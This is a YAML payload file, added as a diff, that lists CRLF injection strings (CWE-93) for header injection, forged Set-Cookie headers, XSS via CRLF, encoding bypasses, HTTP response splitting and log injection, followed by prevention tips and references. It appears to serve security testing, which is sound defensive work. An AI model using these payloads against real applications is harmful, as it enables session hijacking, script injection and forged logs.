@@ -1,0 +1,62 @@
+# A05:2025 - Injection - CRLF Injection Payloads
+# CWE-93: Improper Neutralization of CRLF Sequences in HTTP Headers
+
+payload_category: "crlf-injection"
+owasp_2025: "A05"
+cwe: "CWE-93"
+severity: "MEDIUM"
+
+# ===== BASIC CRLF =====
+basic:
+  header_injection:
+    - "%0d%0aInjected-Header:true"
+    - "%0aInjected-Header:true"
+    - "%0dInjected-Header:true"
+    - "%0d%0a%0d%0aInjected-Header:true"
+    - "\\r\\nInjected-Header:true"
+
+  set_cookie:
+    - "%0d%0aSet-Cookie:hacked=true"
+    - "%0aSet-Cookie:session=attacker"
+    - "%0d%0aSet-Cookie:admin=1;Path=/"
+
+  xss_via_crlf:
+    - "%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert('XSS')</script>"
+    - "%0d%0a%0d%0a<html><script>alert(1)</script></html>"
+
+# ===== ENCODING BYPASS =====
+encoding_bypass:
+  double_encoding:
+    - "%250d%250a"
+    - "%25%30%61"
+    - "%25%30d%25%30a"
+  
+  unicode:
+    - "%u000d%u000a"
+    - "\\u000d\\u000a"
+
+  utf8:
+    - "%c0%8d%c0%8a"
+    - "%e5%98%8a%e5%98%8d"
+
+# ===== HTTP RESPONSE SPLITTING =====
+response_splitting:
+  - "%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>Injected</html>"
+  - "%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie:session=hacked"
+
+# ===== LOG INJECTION =====
+log_injection:
+  - "%0aFake log entry: User logged in successfully"
+  - "%0d%0a[INFO] Admin access granted"
+  - "\\nFake log entry injected"
+
+prevention:
+  - "Strip or encode CR (\\r) and LF (\\n) from user input"
+  - "Use framework-level HTTP response APIs"
+  - "Input validation against CRLF characters"
+  - "URL-encode output in HTTP headers"
+
+references:
+  - "OWASP Top 10:2025 A05"
+  - "CWE-93: CRLF Injection"
+  - "PortSwigger: HTTP response header injection"
